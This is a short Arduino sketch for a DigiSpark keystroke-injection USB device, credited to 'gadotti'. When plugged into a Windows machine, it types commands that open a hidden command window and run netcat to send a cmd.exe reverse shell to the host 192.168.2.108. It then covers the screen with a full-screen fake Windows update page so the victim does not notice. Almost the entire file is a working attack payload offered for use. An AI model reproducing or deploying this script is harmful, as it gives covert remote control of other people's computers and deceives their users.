//This DigiSpark script connect using netcat to a reverse shell and hide everything with a fake windows update screen.
//Credits to gadotti.
#include "DigiKeyboardPtBr.h"
void setup() {
}

void loop() {
  digitalWrite(1, HIGH); // LED on <--> Action start
  
  DigiKeyboardPtBr.sendKeyStroke(0);
  DigiKeyboardPtBr.delay(500);
  DigiKeyboardPtBr.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboardPtBr.delay(500);
  DigiKeyboardPtBr.println("cmd");
  DigiKeyboardPtBr.delay(500);
  DigiKeyboardPtBr.println("MODE CON: COLS=15 LINES=1");
  DigiKeyboardPtBr.delay(100);
  DigiKeyboardPtBr.println("COLOR EF");
  DigiKeyboardPtBr.delay(100);  
  
  DigiKeyboardPtBr.println("cd\\");
  DigiKeyboardPtBr.delay(100);
  DigiKeyboardPtBr.println("cd Netcat");
  DigiKeyboardPtBr.delay(100);
  DigiKeyboardPtBr.println("nc 192.168.2.108 3000 -e cd:\\windows\\system32\\cmd.exe");
  DigiKeyboardPtBr.delay(100);
  
  DigiKeyboardPtBr.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboardPtBr.delay(500);
  DigiKeyboardPtBr.print("http://fakeupdate.net/win10u/index.html");
  DigiKeyboardPtBr.sendKeyStroke(KEY_ENTER);
  DigiKeyboardPtBr.delay(2000);
  DigiKeyboardPtBr.sendKeyStroke(KEY_F11);
  
  digitalWrite(1, LOW); // LED off <--> Action end
  for(;;){ /*empty*/ }
}
